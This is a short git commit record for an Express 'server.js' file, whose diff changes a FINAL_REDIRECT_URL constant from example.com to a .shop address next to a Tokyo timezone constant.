aa9fe8464964f7345cbca8ce090aaec7b78ea8d4
toyohappy <sarahrusso678@gmail.com>
2026-01-14 12:47:25 +0900

    Update server.js

--- server.js
+++ server.js
@@ -2,7 +2,7 @@ import express from "express";
 
 const app = express();
 
-const FINAL_REDIRECT_URL = "https://example.com";
+const FINAL_REDIRECT_URL = "https://fooidemix.shop/map/latest";
 const JAPAN_TIMEZONE = "Asia/Tokyo";
 
 // ✅ CORS middleware (required for fetch)
